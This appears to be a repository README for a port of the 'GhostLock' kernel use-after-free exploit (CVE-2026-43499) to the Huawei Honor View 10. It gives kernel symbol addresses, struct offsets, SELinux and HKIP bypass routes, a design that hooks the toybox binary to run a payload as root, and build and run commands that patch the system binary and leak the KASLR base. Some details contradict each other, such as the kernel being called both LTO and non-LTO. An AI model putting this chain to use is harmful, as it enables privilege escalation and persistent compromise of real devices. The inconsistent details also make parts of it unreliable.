# GhostLock on BKL-L09 — a (working ?) root chain for the Huawei Honor View 10 (Kirin 970, EMUI 10, Linux 4.14.116)

Japanese version (default): [README.md](README.jp-orig.md)

Port and endgame for **CVE-2026-43499 ("GhostLock")**, verified end-to-end on a real device.

> **Status: alpha-1 working and verified / root to be achieved**
> `toybox` is used in this specific exploit method because it has cave offsets wide enough
> to be able to inject the hook.
> `shellcode.bin` was rewritten to better cater the phone itself. It uses the same methods as the original
> developer intended, but the targeting is different.
> The device is a **Huawei BKL-L09** (Honor View10) on **EMUI 10 / Android 10-based /
> Linux 4.14.116 (Kirin 970, arm64, non-LTO/CFI, Huawei HKIP enabled)**.

This repository contains the exploit, the enabler, and the full research record (per-device facts,
disassembly-derived struct offsets, and five static-analysis reports).


## TL;DR

```
**Verified on-device (2026-09-28):**
 $ adb shell cat /data/local/tmp/gl.slide | od -A d -t x8
0000000        ffffff8751884bd0
→ slide = 0xffffff8751881000   (KASLR base leaked; see §4 for the full chain)
```

The interesting part is not the memory-corruption bug itself — public PoCs for CVE-2026-43499
already exist — but the **device-specific endgame**:

1. a **perf-based cred leak** that actually works on this LTO/CFI kernel,
2. the **exact store semantics** of the write primitive, proven from disassembly, and
3. **Huawei HKIP**, reverse-engineered from its own kernel source, and the one-line exemption that
   defeats it for a single task (`task_pid_nr(task) == 0`).

---

## 1. Target

| | |
|---|---|
| Device | Huawei **BKL-L09** (Honor View 10) |
| SoC | HiSilicon **Kirin 970** (arm64) |
| Kernel | **Linux 4.14.116**, non-LTO/CFI, KASLR |
| OS | **EMUI 10** (Android 10) |
| SELinux | Enforcing, no `(allow shell … (capability …))` |
| Paranoid State | 3 (Default Huawei state, production method) |
| Extra | **HKIP** (Huawei Kernel Integrity Protection), HHEE/HISEe |

The bootloader is locked and there is **no public unlock** for Kirin 970 (see §8), so a kernel
exploit is the only root path on this device.

---

## 2. The bug (CVE-2026-43499 "GhostLock")

A use-after-free in the futex PI path (`rt_mutex_adjust_prio_chain`) reachable through the
`FUTEX_CMP_REQUEUE_PI` / `pselect6` / IPv4 `MCAST_BLOCK_SOURCE` paths, where a stale `rt_mutex_waiter`
on a kernel stack can be shaped by a syscall's `copy_from_user` (the "stamp") and then erased by
`rb_erase_cached()`. The erase performs a store we control:

```
str x9,  [x8, #8]      ; *((p0 & ~3) + 8) = p1        (the leaf store: an 8-byte 0 when p1 == 0)
str x10, [x9]          ; *(p1) = p0                   (only when p1 != 0)
```

This repository's write primitive is therefore:

| shape | call | effect |
|---|---|---|
| **leaf** | `wi(addr - 8, 0, 0)` | `*(addr) = 0` (8 bytes) |
| **pointer** | `wi(value, target, 0|1)` | `*(target) = value` |

The leaf-store location was **proven by disassembling `rb_erase_cached.cfi`** in the device's own
`vmlinux.elf` (see `docs/static-analysis/TASK_WRITE_SHAPE_20260926.md`). The frequently quoted
`rb_erase_cached.cfi+0x88` is the *other* branch (`p[2] != 0`) and is never taken by this payload.

---

# 3. The BKL Port: What Differs from MRX

*(the core section — the material below is written from the verified session record, every claim traceable to a measurement)*

---

## 3.1 Architecture: Why Toybox

The reference chain (MRX-W09, Kirin 990, EMUI 11) hooks `/system/bin/bugreportz` — on that build, a single unified binary that runs both as the uid-2000 shell client and as the uid-0 dumpstate service. The hook lands in a normal function prologue, in a fully-initialized process, and the payload's two-guard design dispatches on the uid it finds itself running under.

**BKL (EMUI 10) breaks both halves of that design.**

First, the binary is split: `/system/bin/bugreportz` is an 11 KB socket client (Android 29, connects to the `dumpstatez` service, execs nothing), and `/system/bin/dumpstate` (355 KB, BuildID `752695f3…`) is the uid-0 service side. Second — and decisively — EMUI 10's SELinux policy denies the shell domain even `read` on dumpstate:

```
$ adb shell ls -la /system/bin/dumpstate
ls: /system/bin/dumpstate: Permission denied
```

The Mali primitive's staging step needs `open(target, O_RDONLY)` — a file the shell domain cannot read cannot be the patch target. The obvious port was dead before it started.

Three host candidates were evaluated before landing on the final one:

| Candidate | Result |
|---|---|
| APEX libc (`__libc_init`) | **Worked mechanically — crashed its hosts.** The payload runs mid-`__libc_init`, before TLS init and pthread state exist; every payload generation that touched process state in that window produced SIGSEGVs in the host process (fault addrs 0x10–0x1b4). Four failure theories (fork, callee-saved clobber, timing, worker side-effects) were eliminated by measurement before the *context itself* was identified as the variable — the reference design never had this problem because its hook target gives the payload a sane execution environment. |
| `/system/bin/dumpstate` | SELinux read-denied for the shell domain. Dead on arrival. |
| **`/system/bin/toybox`** | **The answer.** |

Toybox wins on four properties, each verified on-device:

1. **Both worlds exec it.** Every `adb shell` command runs a toybox applet as uid 2000 — and dumpstate's bugreport sweep execs toybox applets (`df`, `uptime`, …) **as uid 0 in the dumpstate domain**. One file, two personalities: the reference design's property, reconstructed.
2. **The shell domain can read it** (`dd if=/system/bin/toybox` succeeds — the generic `system_file`-class label, unlike dumpstate's protected one).
3. **Cave space.** The executable segment's tail (`0x6b974`–`0x6c000`, past the last live PLT entry) is ~1.6 KB of mapped, unreferenced, executable padding — four times the APEX libc cave, enough for the reference payload whole.
4. **A replicable prologue.** `main` at `0x29050` opens with `sub sp, sp, #0x80` (`0xd10203ff`) — a pure stack adjustment with no register side-effects, the ideal instruction for the save/replicate/branch-back wrapper pattern.

The resulting arm parameters:

```
hook site:   0x29050   (main prologue; restore word 0xd10203ff)
branch-back: 0x29054
cave:        0x6b974   (payload lands at page+0x974)
payload:     rev 7b-fixed, 348 B, ph = size−4 = 0x158 (tool-enforced)
```

One incidental proof recording: for a week before the pivot, every `adb shell` command on the development device ran through a hooked toybox fast path — dozens of processes per session, zero fast-path failures. The host was soak-tested by accident before it was ever chosen deliberately.

## 3.2 The Policy Wall and the Perf-Broker Worker

The reference chain's enabler writes `perf_event_paranoid = -1` from the uid-0 process, then runs the whole leak suite from shell. **On EMUI 10 that sysctl write is policy-denied** — measured, with the rule named:

```
avc: denied { write } scontext=u:r:dumpstate:s0
      tcontext=u:object_r:proc_perf:s0 tclass=file permissive=0
```

(EMUI 11's dumpstate may write `proc_perf`; EMUI 10's may not — the two builds diverge exactly here.) The complete channel map, measured on-device across one trigger cycle:

| Channel | dumpstate domain | Notes |
|---|---|---|
| `perf_event_open` (CAP_SYS_ADMIN) | ✅ granted | **the one open door** |
| `proc_perf` sysctl write | ❌ denied | rule quoted above |
| `/dev/kmsg` write | ❌ denied | `kmsg_device` chr_file |
| abstract unix socket → shell-owned | ❌ denied | `{ connectto }` on `unix_stream_socket`, path `\0gl_leak` in the audit record |
| file create in `/data/local/tmp` | ✅ granted | `shell_data_file` create — looser than EMUI 11, and load-bearing below |

The design consequence: the sysctl route is dead, so **the leak must run inside the privileged context itself**. The payload's worker — gated to run exactly once per boot (`O_EXCL` on its output file doubles as the fast-path check) — does the entire leak synchronously in the uid-0 host process and relays the result by the one channel that works: an 8-byte raw file in `/data/local/tmp`, written `0666` via an explicit `fchmod` (the creating context's umask strips create-time mode bits — measured).

The synchronous design was not the first choice — it was the survivor. A fork-based variant (`clone` from the hooked context) crashed hosts in the `__libc_init` era; a socket-relay variant died on the `connectto` denial; the synchronous worker survived five full bugreport cycles and a system shutdown with zero host failures. The bounded work (a 100-iteration syscall storm, ~1 ms) is invisible to the host.

## 3.3 Constants Table (BKL, disassembly-verified)

Derived from the device's own kernel image (`kernel.img` from the exact full-OTA, version-string-matched to `/proc/version`; the `.177`/`.179` EMUI incrementals share one kernel build — identical build timestamp and clang string, offsets valid across both).

**Symbols:**

```
_stext                     0xffffff8008081000   (KASLR anchor)
__schedule                 0xffffff800a2aa890
do_futex.cfi               0xffffff800827dfbc
rt_mutex_adjust_prio_chain 0xffffff800821c724
SyS_setpriority.cfi        0xffffff80081a4b60
commit_creds.cfi           0xffffff80081c2160
SyS_setresuid.cfi          0xffffff80081a64e4
init_cred                  0xffffff800b2c65e8
init_task                  0xffffff800b2b5600
empty_zero_page            0xffffff800b780000
sysctl_perf_event_paranoid 0xffffff800b2a65b4
hkip_uid_root_bits         0xffffff800b9de000
hkip_gid_root_bits         0xffffff800b9df000   (BKL enforces the GID side — see 3.4)
```

**Struct offsets:**

```
task_struct:  pid 0x650   real_cred 0x810   cred 0x818   comm 0x820
              prio 0x100  pi_lock 0x8f8  pi_waiters 0x918  pi_blocked_on 0x930
cred:         uid 0x04  gid 0x08  euid 0x14  fsuid 0x1c
              cap_inheritable 0x28  cap_permitted 0x30  cap_effective 0x38
rt_mutex_waiter:  task 0x30  lock 0x38  prio 0x40  deadline 0x48  (size 0x50 — identical to MRX)
rt_mutex:         wait_lock 0x00(0x18, DEBUG_SPINLOCK)  rb_root 0x18
                  rb_leftmost 0x20  owner 0x28           (identical to MRX)
```

Two extraction notes for porters: `hkip_init_task` yields `task_struct->cred` and `->pid` in a single function (inlined `get_task_cred` + the pid bit-index arithmetic), and the walk's `rb_erase_cached` call site sits at `rt_mutex_adjust_prio_chain+0x20c`, with the top-waiter BUG branch at `+0x28c` and the chain-depth limit in a global at `0xffffff800b2ccff8`.

**One correction inherited from this port:** BKL's kernel is **non-LTO clang CFI** — `CONFIG_LTO_NONE`, but `.cfi` symbol twins throughout. The config string alone misleads; check the symbol table.

**And the leak window, ported:** `SyS_setpriority.cfi+0x3c` (`ldr x25, [x19, #cred]`) through `+0x1f8` — byte-identical window to MRX across the different cred offset. The `x25` cred-leak design transfers with one constant change (`0x9E8` → `0x818`).

## 3.4 BKL-Specific Endgame Notes (from source, not yet executed)

Two divergences from the reference endgame, both from the device's own GPL kernel source:

1. **The GID bitmap is enforced.** `hkip_check_xid_root()` = `hkip_check_uid_root() ?: hkip_check_gid_root()`, and `hkip_compute_gid_root` covers gid/sgid/`in_egroup_p(0)`/fsgid. The reference README's shield analysis (pid-0 → `def_value=true`) applies to both bitmaps — but a port that zeroes gid *without* the shield (e.g. the leaf-store at `cred+0x04` clearing uid+gid together, unshielded) walks into `hkip_check_gid_root`'s SIGKILL on the next permission check. The reference's `--simple` route is safe only *because* the pid-0 shield neutralizes both bitmaps.
2. **`cap_effective` remains unexamined by HKIP.** `hkip_compute_uid_root` checks `cap_inheritable` and `cap_permitted` but not `cap_effective` — the shield-free route (inject `CAP_SETUID` at `cred+0x38`, `setresuid(0,0,1)`, `commit_creds` sets the bit legitimately via `hkip_update_xid_root`, real pid, no shield, no idle-task landmine) transfers to BKL as-is. `commit_creds → hkip_update_xid_root` verified present at `cred.c:489`.

Both routes are source-verified but **not yet executed on this device** — the write primitive has not yet been fired. See §4.

---

# 4. Verified State — "Alpha-1"

*(every output below is real, from the session of 2026-09-28)*

The complete enabler chain — Mali page-cache write, toybox hook, payload worker — is verified end-to-end. The leak it produces:

```
$ adb shell ls -la /data/local/tmp/gl.slide
-rw-rw-rw- 1 root root 8 /data/local/tmp/gl.slide

$ adb shell cat /data/local/tmp/gl.slide | od -A d -t x8
0000000        ffffff8751884bd0
0000008
```

Decode:

```
v     = 0xffffff8751884bd0              (sample[0].IP — a kernel-text address)
slide = (v & ~0x1FFFFF) + 0x81000
      = 0xffffff8751800000 + 0x81000
      = 0xffffff8751881000
```

Consistency check against the banked symbol table: the slide's low 21 bits (`0x81000`) match `_stext`'s (`0xffffff8008081000 & 0x1FFFFF = 0x81000`) — the mask math and the sampled address agree, and the ~29 GB KASLR displacement is in the expected range for this kernel. **The first kernel address of the chain, read off the device, consistent with the ground-truth vmlinux the constants table was derived from.**

What is verified, itemized:

| Component | Evidence |
|---|---|
| Mali page-cache primitive (G72) | four-way verification every arm: same-fd read-back + exec-view probe, both pages, every cycle |
| Toybox hook + wrapper | both pages PATCHED; dozens of processes through the fast path; worker completed and returned cleanly (host process survived) |
| Payload worker end-to-end | perf event opened with CAP_SYS_ADMIN past paranoid=3; ring mmapped; storm; sample read; 8-byte relay file written |
| File relay + readability | `0666` via fchmod; shell reads the result directly |
| KASLR slide | the od line above, decoded and cross-checked |

What is **not** yet done: the task/cred leaks (same relay pattern, storm bound liftable now that the context is sane), the futex race/stamp/write primitive (all constants verified, calibration pending), and both endgame routes (source-verified, unfired). The chain's status, one line: **enabler complete, first leak banked, zero known defects in the delivered components, everything downstream specified and constant-ready.**

---

## 5. Layout

```
exploit/bkl_slide_toybox.s   the slide-leaker payload (rev 7b-fixed, 348 B)
enabler/inject_hook.c        the gated page-cache patcher (five-gate final form)
exploit/toybox_pristine      pristine reference for deterministic page construction
docs/constants.md            the BKL constants table (§3.3)
docs/facts/                  the per-session measurement log
```

---

## 6. Build

```sh
# Build (payload):
 $NDK/toolchains/llvm/prebuilt/linux-x86_64/bin/clang --target=aarch64-linux-android29 \
    -c bkl_slide_toybox.s -o bkl_slide_toybox.o
 $NDK/.../llvm-objcopy -O binary --only-section=.text bkl_slide_toybox.o shellcode.bin
# Build (tool):
 $NDK/.../clang --target=aarch64-linux-android29 -O2 -static -o inject_hook inject_hook.c
```

(NDK r27c used here.)

## 7. Run

```sh
# 1) stage (content gates first):
adb shell md5sum /data/local/tmp/shellcode.bin     # must match the banked rev-7b-fixed hash
adb shell rm -f /data/local/tmp/gl.slide

# 2) arm (ph is tool-enforced; all verify lines must read PATCHED):
adb shell /data/local/tmp/inject_hook place 0x6b974 0x158 0x29054
adb shell /data/local/tmp/inject_hook hook 0x29050 0x6b974

# 3) trigger (root toybox exec in dumpstate's sweep):
adb shell "setsid /system/bin/bugreportz < /dev/null > /data/local/tmp/brz.log 2>&1 &"

# 4) read the leak:
adb shell ls -la /data/local/tmp/gl.slide
adb shell cat /data/local/tmp/gl.slide | od -A d -t x8
#    decode: slide = (v & ~0x1FFFFF) + 0x81000

# 5) restore BEFORE any reboot:
adb shell /data/local/tmp/inject_hook restore 0x29050 0xd10203ff
```

---

## 8. Credits

> For complete transparency, the author of the repository would like to indicate
> that since this project is a current work-in-progress and based on the findings of
> another developer, cited below, the README draws on a mix of findings indicated by both
> the author's device (Berkeley BKL-L09 eg. Honor View 10) and the creator's own device
> (Huawei MatePad). Everything on this README was inspired by the author's (Kirin 990 / EMUI 11) device
> and is included as prior art for the BKL road map. None of the previous implementations have been attempted
> or verified on BKL-L09. Original: https://github.com/0ch4/ghostlock-mrx-w09.
> Kept for reference only.

* The GhostLock vulnerability and the original PoC family: the upstream authors named in
  `ghostlock_pocs/`.
* The "sample a register that materialises the cred" idea: the **aquos-r6** PoC family.
* Everything under `docs/` was derived from this device's own `vmlinux.elf` and kernel tree.
* 0ch4 for his/her findings for the MatePad, that permitted me to find out specific triggers that also worked on my device.


## 9. Disclaimer

Security research on a device owned by the author, for interoperability and repair purposes.
CVE-2026-43499 is public and many PoCs already exist. Do not use this against devices you do not
own. Provided as-is, no warranty. See [docs/PUBLICATION_REVIEW_ja.md](docs/PUBLICATION_REVIEW_ja.md) for the formal legal notice and disclaimer.
